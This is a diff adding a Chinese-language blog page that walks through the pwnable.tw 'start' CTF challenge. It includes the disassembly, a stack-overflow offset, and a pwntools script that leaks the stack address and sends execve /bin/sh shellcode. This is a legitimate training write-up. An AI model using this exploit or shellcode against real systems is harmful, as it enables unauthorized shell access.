@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="author" content="Vancir" />
+  <title>pwnable.tw start</title>
+  <link rel="shortcut icon" href="/favicon.ico" />
+  <link href="/feed/" rel="alternate" title="Vancir" type="application/atom+xml" />
+  <link rel="stylesheet" href="/media/css/style.css" />
+  <link rel="stylesheet" href="/media/css/highlight.css" />
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+  <script type="text/javascript" src="/media/js/outliner.js"></script>
+</head>
+<!--  <body> 
+-->
+<script type="text/javascript">
+  function setTimeSpan() {
+    var date = new Date();
+    timeSpan.innerText = date.format('yyyy-MM-dd hh:mm:ss');
+  }
+
+  Date.prototype.format = function (format) {
+    var o =
+      {
+        "M+": this.getMonth() + 1, //month
+        "d+": this.getDate(),    //day
+        "h+": this.getHours(),   //hour
+        "m+": this.getMinutes(), //minute
+        "s+": this.getSeconds(), //second
+        "q+": Math.floor((this.getMonth() + 3) / 3),  //quarter
+        "S": this.getMilliseconds() //millisecond
+      }
+    if (/(y+)/.test(format))
+      format = format.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
+    for (var k in o)
+      if (new RegExp("(" + k + ")").test(format))
+        format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ("00" + o[k]).substr(("" + o[k]).length));
+    return format;
+  }
+</script>
+
+<body onLoad="setInterval(setTimeSpan,1000);">
+  <div id="container">
+    <div id="main" role="main">
+      <header>
+        <h1>pwnable.tw start</h1>
+      </header>
+      <nav id="real_nav">
+        <span>
+          <a title="home" class="" href="/">home</a>
+        </span>
+        <span>
+          <a title="categories" class="" href="/categories/">categories</a>
+        </span>
+        <span>
+          <a title="tags" class="" href="/tags/">tags</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/repo/">repo</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/act/">act</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/books/">books</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/musics/">musics</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/movies/">movies</a>
+        </span>
+        <span>
+          <a title="links" class="" href="/friends/">friends</a>
+        </span>
+        <span>
+          <a title="about" class="" href="/about/">about</a>
+        </span>
+        <span>
+          <a title="feed" class="" href="/feed">subscribe</a>
+        </span>
+      </nav>
+      <article class="content">
+        <section class="meta">
+<span class="time">
+  <time datetime="2017-11-26">2017-11-26</time>
+</span>
+
+ | 
+<span class="categories">
+  categories
+  
+  <a href="/categories/#writeups" title="writeups">writeups</a>&nbsp;
+  
+</span>
+
+
+ | 
+<span class="tags">
+  tags
+  
+  <a href="/tags/#CTF" title="CTF">CTF</a>&nbsp;
+  
+  <a href="/tags/#pwn" title="pwn">pwn</a>&nbsp;
+  
+</span>
+
+</section>
+<section class="post">
+<p>用IDA打开，程序其实是单纯用汇编写的，通过系统调用来输出<code class="highlighter-rouge">Let's start the CTF:</code>并获取输入。</p>
+
+<pre><code class="language-asm">.text:08048060 _start          proc near
+.text:08048060                 push    esp
+.text:08048061                 push    offset _exit
+.text:08048066                 xor     eax, eax
+.text:08048068                 xor     ebx, ebx
+.text:0804806A                 xor     ecx, ecx
+.text:0804806C                 xor     edx, edx
+.text:0804806E                 push    3A465443h
+.text:08048073                 push    20656874h
+.text:08048078                 push    20747261h
+.text:0804807D                 push    74732073h
+.text:08048082                 push    2774654Ch
+.text:08048087                 mov     ecx, esp        ; addr
+.text:08048089                 mov     dl, 14h         ; len
+.text:0804808B                 mov     bl, 1           ; fd
+.text:0804808D                 mov     al, 4
+.text:0804808F                 int     80h             ; LINUX - sys_write
+.text:08048091                 xor     ebx, ebx
+.text:08048093                 mov     dl, 3Ch
+.text:08048095                 mov     al, 3
+.text:08048097                 int     80h             ; LINUX -
+.text:08048099                 add     esp, 14h
+.text:0804809C                 retn
+</code></pre>
+
+<p>使用<code class="highlighter-rouge">pattern_create</code>和<code class="highlighter-rouge">pattern_offset</code>获取到溢出的偏移是<code class="highlighter-rouge">20</code></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x08048087</span>
+
+<span class="n">payload1</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">20</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">':'</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>在<code class="highlighter-rouge">_start</code>函数开始进行了<code class="highlighter-rouge">push    esp</code>和<code class="highlighter-rouge">push    offset _exit</code>，因此<code class="highlighter-rouge">retn</code>时会回到<code class="highlighter-rouge">_exit</code>函数继续执行。</p>
+
+<p>因此，只要我们将这个<code class="highlighter-rouge">retn</code>返回地址覆盖，就可以转到任意地址继续执行。</p>
+
+<p>这里我们将其覆盖为<code class="highlighter-rouge">0x08048087</code>，为什么呢？这里是<code class="highlighter-rouge">.text:08048087                 mov     ecx, esp        ; addr</code>，因为在其下的<code class="highlighter-rouge">sys_write</code>函数可以取出<code class="highlighter-rouge">esp</code>赋给<code class="highlighter-rouge">ecx</code>，然后输出<code class="highlighter-rouge">ecx</code>的内容。因此我们可以通过这样，泄漏出<code class="highlighter-rouge">saved esp</code>的位置</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">debug</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="n">local</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="n">x86</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>
+<span class="k">if</span> <span class="n">x86</span><span class="p">:</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'/lib32/libc.so.6'</span><span class="p">)</span>
+    <span class="c">#libc = ELF('./libc-2.23.so')</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">local</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./start'</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chall.pwnable.tw'</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
+
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</span><span class="s">'</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x08048087</span> <span class="c"># mov     ecx, esp</span>
+<span class="n">payload1</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mi">20</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> 
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">':'</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="c"># leak saved_esp</span>
+
+<span class="c">#leak+20是因为retn前add     esp, 14h</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mi">20</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">leak</span><span class="o">+</span><span class="mi">20</span><span class="p">)</span>  <span class="o">+</span> <span class="n">shellcode</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+</section>
+<section align="right">
+<br/>
+<span>
+	<a  href="/2017/11/26/hxb-pwnme/" class="pageNav"  >Previous</a>
+	&nbsp;&nbsp;&nbsp;
+	<a  href="/2017/12/01/objdump-limitations/" class="pageNav"  >Next</a>
+</span>
+</section>
+
+<script type="text/javascript">
+$(function(){
+  $(document).keydown(function(e) {
+    var url = false;
+        if (e.which == 37 || e.which == 74) {  // Left arrow and J
+            
+        url = 'http://localhost:4000/2017/11/26/hxb-pwnme/';
+        
+        }
+        else if (e.which == 39 || e.which == 75) {  // Right arrow and K
+            
+        url = 'http://localhost:4000/2017/12/01/objdump-limitations/';
+        
+        }
+        if (url) {
+            window.location = url;
+        }
+  });
+})
+</script>
+
+      </article>
+      <a style="position:fixed;bottom:5px;right:5px;" href="#" title="Back to Top">
+        <img src="/assets/btt.png" />
+      </a>
+    </div>
+    <footer>
+      <p>
+        <small>
+          Powered by
+          <a href="http://jekyllrb.com" target="_blank">Jekyll</a> @
+          <a href="https://github.com/Vancir/vancir.github.io" target="_blank" title="project homepage">github</a> | Copyright 2017 - 2018 by
+          <a href="/about/">Vancir</a> |
+          <span class="label label-info" id="timeSpan"></span>
+        </small>
+      </p>
+    </footer>
+  </div>
+</body>
+
+</html>
